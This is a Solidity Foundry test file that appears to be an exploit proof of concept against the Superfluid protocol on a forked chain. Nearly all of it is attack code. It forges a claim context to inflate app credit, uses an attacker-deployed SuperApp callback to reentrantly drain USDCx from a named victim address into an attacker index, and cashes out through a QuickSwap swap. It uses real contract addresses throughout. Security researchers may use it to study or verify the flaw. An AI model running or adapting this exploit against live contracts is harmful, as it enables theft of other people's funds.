// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperToken {
    function balanceOf(address account) external view returns (uint256);
    function getHost() external view returns (address);
    function downgrade(uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ISETH is ISuperToken {
    function upgradeByETH() external payable;
    function downgradeToETH(uint256 wad) external;
}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);

    function callAgreementWithContext(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData,
        bytes calldata ctx
    ) external returns (bytes memory newCtx, bytes memory returnedData);

    function registerApp(uint256 configWord) external;
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function createIndex(
        ISuperToken token,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateIndex(
        ISuperToken token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function distribute(
        ISuperToken token,
        uint32 indexId,
        uint256 amount,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function approveSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateSubscription(
        ISuperToken token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getIndex(
        ISuperToken token,
        address publisher,
        uint32 indexId
    )
        external
        view
        returns (
            bool exist,
            uint128 indexValue,
            uint128 totalUnitsApproved,
            uint128 totalUnitsPending
        );

    function getSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber
    )
        external
        view
        returns (
            bool exist,
            bool approved,
            uint128 units,
            uint256 pendingDistribution
        );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface ISuperApp {
    function beforeAgreementCreated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata ctx
    ) external view returns (bytes memory cbdata);

    function afterAgreementCreated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata cbdata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function beforeAgreementUpdated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata ctx
    ) external view returns (bytes memory cbdata);

    function afterAgreementUpdated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata cbdata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function beforeAgreementTerminated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata ctx
    ) external view returns (bytes memory cbdata);

    function afterAgreementTerminated(
        address superToken,
        address agreementClass,
        bytes32 agreementId,
        bytes calldata agreementData,
        bytes calldata cbdata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);
}

/// @title Attempt1
/// @notice Hypothesis A: Patch 1 is live on normal host-mediated agreement paths,
///         but Patch 2 is absent so a direct `IDA.claim()` still accepts attacker
///         ctx. The claim callback into a registered SuperApp receives forged
///         `appCreditGranted`, `appAddress`, and `appCreditToken`, allowing a
///         reentrant `host.callAgreementWithContext` that force-distributes USDCx
///         on an attacker-owned drain index.
contract Attempt1 is Test {
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant KNOWN_USDCX_VICTIM = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;
    uint256 constant FORK_BLOCK = 27_039_967;

    uint32 constant TRIGGER_INDEX_ID = 55_100_001;
    uint32 constant DRAIN_INDEX_ID = 55_100_002;
    uint32 constant PATCH_CHECK_INDEX_ID = 55_100_003;
    uint256 constant TRIGGER_DEPOSIT_WEI = 1;
    uint256 constant APP_LEVEL_FINAL = 1 << 1;

    ISuperfluidHost constant HOST = ISuperfluidHost(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 constant IDA =
        IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    ISETH constant MATICX = ISETH(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
    ISuperToken constant USDCX = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
    IERC20 constant USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IUniswapV2Router02 constant QUICKSWAP =
        IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
    address constant WMATIC = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker");
        vm.label(KNOWN_USDCX_VICTIM, "KnownUSDCxVictim");
        vm.label(address(HOST), "SuperfluidHost");
        vm.label(address(IDA), "IDA");
        vm.label(address(MATICX), "MATICx");
        vm.label(address(USDCX), "USDCx");
        vm.label(address(USDC), "USDC");
    }

    function test_hypothesisA_claim_ctx_credit_inflation() public {
        uint256 nativeBefore = ATTACKER.balance;
        uint256 victimUsdcx = USDCX.balanceOf(KNOWN_USDCX_VICTIM);

        console.log("[start] attacker native:", nativeBefore);
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);
        console.log("[preflight] victim USDCx:", victimUsdcx);

        assertGt(victimUsdcx, 0, "known victim has no USDCx on ch5");
        assertEq(USDCX.getHost(), address(HOST), "USDCx host mismatch");

        vm.startPrank(ATTACKER);

        AttackerSuperApp app = new AttackerSuperApp(
            HOST,
            IDA,
            MATICX,
            USDCX,
            DRAIN_INDEX_ID,
            victimUsdcx
        );
        console.log("[setup] attacker app:", address(app));
        app.attemptRegister(APP_LEVEL_FINAL);
        console.log("[setup] registerApp ok:", app.registrationOk());
        console.log("[setup] registerApp revert:");
        console.logBytes(app.lastRegistrationRevertData());

        _assertPatch1GuardPresent();
        app.seedDrainIndex(ATTACKER);
        _approveDrainSubscription(address(app));
        app.seedTriggerIndex{value: TRIGGER_DEPOSIT_WEI}(address(app), TRIGGER_INDEX_ID);
        _assertTriggerState(address(app));

        bytes memory fakeCtx = _buildFakeClaimContext(address(app), address(USDCX));
        console.log("[claim] forged ctx length:", fakeCtx.length);

        (bool claimOk, bytes memory claimRet) = address(IDA).call(
            abi.encodeCall(IDA.claim, (MATICX, address(app), TRIGGER_INDEX_ID, address(app), fakeCtx))
        );
        console.log("[claim] direct call ok:", claimOk);
        if (claimOk) {
            bytes memory newCtx = abi.decode(claimRet, (bytes));
            console.log("[claim] returned newCtx length:", newCtx.length);
        } else {
            console.log("[claim] revert:");
            console.logBytes(claimRet);
        }

        console.log("[callback] afterAgreementUpdated calls:", app.afterUpdatedCalls());
        console.log("[callback] last appCreditGranted:", app.lastAppCreditGranted());
        console.log("[callback] last appAddress:", app.lastAppAddress());
        console.log("[callback] last appCreditToken:", app.lastAppCreditToken());
        console.log("[callback] last subcall ok:", app.lastSubcallOk());
        console.log("[callback] last subcall revert:");
        console.logBytes(app.lastSubcallRevertData());

        uint256 attackerUsdcx = USDCX.balanceOf(ATTACKER);
        console.log("[state] attacker USDCx after claim:", attackerUsdcx);

        vm.stopPrank();

        assertTrue(claimOk, _decodeRevert(claimRet));
        assertGt(app.afterUpdatedCalls(), 0, "claim did not reach SuperApp callback");
        assertTrue(app.lastSubcallOk(), _decodeRevert(app.lastSubcallRevertData()));

        vm.startPrank(ATTACKER);
        if (attackerUsdcx > 0) {
            USDCX.downgrade(attackerUsdcx);
        }
        uint256 attackerUsdc = USDC.balanceOf(ATTACKER);
        console.log("[cashout] attacker USDC after downgrade:", attackerUsdc);
        if (attackerUsdc > 0) {
            bool approved = USDC.approve(address(QUICKSWAP), attackerUsdc);
            assertTrue(approved, "USDC approve failed");

            address[] memory path = new address[](2);
            path[0] = address(USDC);
            path[1] = WMATIC;
            QUICKSWAP.swapExactTokensForETH(attackerUsdc, 0, path, ATTACKER, block.timestamp + 60);
        }
        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("[end] attacker native:", nativeAfter);
        console.log("[delta] attacker native:", nativeAfter - nativeBefore);
        assertGt(nativeAfter, nativeBefore, "native balance must increase");
    }

    function _assertPatch1GuardPresent() internal {
        bytes memory fakeCtx = _buildForgedContext(KNOWN_USDCX_VICTIM, IDA.createIndex.selector);
        bytes memory inner = abi.encodeCall(IDA.createIndex, (USDCX, PATCH_CHECK_INDEX_ID, fakeCtx));
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));

        (bool ok, bytes memory ret) =
            address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, outer, new bytes(0))));

        console.log("[patch-check] forged createIndex via host ok:", ok);
        console.log("[patch-check] revert:");
        console.logBytes(ret);

        assertTrue(!ok, "host accepted old trailing-bytes ctx forgery");
        assertTrue(_contains(_decodeRevert(ret), "invalid ctx"), "expected invalid ctx guard on host path");
    }

    function _approveDrainSubscription(address publisher) internal {
        _callAgreement(
            abi.encodeCall(IDA.approveSubscription, (USDCX, publisher, DRAIN_INDEX_ID, new bytes(0))),
            "approve drain subscription"
        );

        (bool exist, bool approved, uint128 units, uint256 pending) =
            IDA.getSubscription(USDCX, publisher, DRAIN_INDEX_ID, ATTACKER);
        console.log("[drain] subscription exists:", exist);
        console.log("[drain] subscription approved:", approved);
        console.log("[drain] subscription units:", units);
        console.log("[drain] subscription pending:", pending);

        assertTrue(exist, "drain subscription missing");
        assertTrue(approved, "drain subscription not approved");
    }

    function _assertTriggerState(address publisher) internal view {
        (bool exist, bool approved, uint128 units, uint256 pending) =
            IDA.getSubscription(MATICX, publisher, TRIGGER_INDEX_ID, publisher);
        console.log("[trigger] subscription exists:", exist);
        console.log("[trigger] subscription approved:", approved);
        console.log("[trigger] subscription units:", units);
        console.log("[trigger] pending distribution:", pending);

        assertTrue(exist, "trigger subscription missing");
        assertTrue(!approved, "trigger subscription unexpectedly approved");
        assertGt(pending, 0, "trigger subscription has no pending distribution");
    }

    function _callAgreement(bytes memory inner, string memory step) internal {
        (bool ok, bytes memory ret) = address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, inner, new bytes(0))));
        if (!ok) {
            console.log("[revert] step:");
            console.log(step);
            console.logBytes(ret);
            revert(string.concat(step, ": ", _decodeRevert(ret)));
        }
    }

    function _buildForgedContext(address msgSender, bytes4 selector) internal view returns (bytes memory) {
        ContextUtils.Context memory ctx = ContextUtils.buildContext(msgSender, selector, "");
        return ContextUtils.encodeContext(ctx);
    }

    function _buildFakeClaimContext(address appAddress, address appCreditToken) internal view returns (bytes memory) {
        ContextUtils.Context memory ctx = ContextUtils.buildContext(appAddress, IDA.claim.selector, "");
        ctx.appCreditGranted = type(uint128).max;
        ctx.appAddress = appAddress;
        ctx.appCreditToken = appCreditToken;
        return ContextUtils.encodeContext(ctx);
    }

    function _contains(string memory haystack, string memory needle) internal pure returns (bool) {
        bytes memory a = bytes(haystack);
        bytes memory b = bytes(needle);
        if (b.length == 0 || b.length > a.length) {
            return false;
        }

        for (uint256 i = 0; i <= a.length - b.length; ++i) {
            bool found = true;
            for (uint256 j = 0; j < b.length; ++j) {
                if (a[i + j] != b[j]) {
                    found = false;
                    break;
                }
            }
            if (found) {
                return true;
            }
        }
        return false;
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "silent revert";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }

    receive() external payable {}
}

contract AttackerSuperApp is ISuperApp {
    ISuperfluidHost public immutable host;
    IInstantDistributionAgreementV1 public immutable ida;
    ISETH public immutable triggerToken;
    ISuperToken public immutable drainToken;
    uint32 public immutable drainIndexId;
    uint256 public immutable attackAmount;

    bool public registrationOk;
    bytes public lastRegistrationRevertData;
    uint256 public afterUpdatedCalls;
    uint256 public lastAppCreditGranted;
    address public lastAppAddress;
    address public lastAppCreditToken;
    bool public lastSubcallOk;
    bytes public lastSubcallRevertData;

    constructor(
        ISuperfluidHost host_,
        IInstantDistributionAgreementV1 ida_,
        ISETH triggerToken_,
        ISuperToken drainToken_,
        uint32 drainIndexId_,
        uint256 attackAmount_
    ) {
        host = host_;
        ida = ida_;
        triggerToken = triggerToken_;
        drainToken = drainToken_;
        drainIndexId = drainIndexId_;
        attackAmount = attackAmount_;
    }

    function attemptRegister(uint256 configWord) external {
        (registrationOk, lastRegistrationRevertData) =
            address(host).call(abi.encodeCall(host.registerApp, (configWord)));
    }

    function seedDrainIndex(address subscriber) external {
        _callAgreement(abi.encodeCall(ida.createIndex, (drainToken, drainIndexId, new bytes(0))));
        _callAgreement(
            abi.encodeCall(ida.updateSubscription, (drainToken, drainIndexId, subscriber, uint128(1), new bytes(0)))
        );
    }

    function seedTriggerIndex(address subscriber, uint32 triggerIndexId) external payable {
        triggerToken.upgradeByETH{value: msg.value}();
        _callAgreement(abi.encodeCall(ida.createIndex, (triggerToken, triggerIndexId, new bytes(0))));
        _callAgreement(
            abi.encodeCall(ida.updateSubscription, (triggerToken, triggerIndexId, subscriber, uint128(1), new bytes(0)))
        );
        _callAgreement(abi.encodeCall(ida.updateIndex, (triggerToken, triggerIndexId, uint128(1), new bytes(0))));
    }

    function beforeAgreementCreated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata
    ) external pure returns (bytes memory cbdata) {
        return cbdata;
    }

    function afterAgreementCreated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata,
        bytes calldata ctx
    ) external pure returns (bytes memory newCtx) {
        return ctx;
    }

    function beforeAgreementUpdated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata
    ) external pure returns (bytes memory cbdata) {
        return cbdata;
    }

    function afterAgreementUpdated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata,
        bytes calldata ctx
    ) external returns (bytes memory newCtx) {
        afterUpdatedCalls += 1;

        ContextUtils.Context memory decoded = ContextUtils.decodeContext(ctx);
        lastAppCreditGranted = decoded.appCreditGranted;
        lastAppAddress = decoded.appAddress;
        lastAppCreditToken = decoded.appCreditToken;

        bytes memory subcallData = abi.encodeCall(
            host.callAgreementWithContext,
            (
                ida,
                abi.encodeCall(ida.distribute, (drainToken, drainIndexId, attackAmount, new bytes(0))),
                new bytes(0),
                ctx
            )
        );

        bytes memory ret;
        (lastSubcallOk, ret) = address(host).call(subcallData);
        if (lastSubcallOk) {
            (bytes memory updatedCtx,) = abi.decode(ret, (bytes, bytes));
            lastSubcallRevertData = "";
            return updatedCtx;
        }

        lastSubcallRevertData = ret;
        return ctx;
    }

    function beforeAgreementTerminated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata
    ) external pure returns (bytes memory cbdata) {
        return cbdata;
    }

    function afterAgreementTerminated(
        address,
        address,
        bytes32,
        bytes calldata,
        bytes calldata,
        bytes calldata ctx
    ) external pure returns (bytes memory newCtx) {
        return ctx;
    }

    function _callAgreement(bytes memory callData) internal {
        (bool ok, bytes memory ret) = address(host).call(abi.encodeCall(host.callAgreement, (ida, callData, new bytes(0))));
        require(ok, _bubble(ret));
    }

    function _bubble(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length >= 68) {
            bytes4 selector;
            assembly {
                selector := mload(add(revertData, 32))
            }
            if (selector == 0x08c379a0) {
                assembly {
                    revertData := add(revertData, 4)
                }
                return abi.decode(revertData, (string));
            }
        }
        return "app helper failed";
    }
}
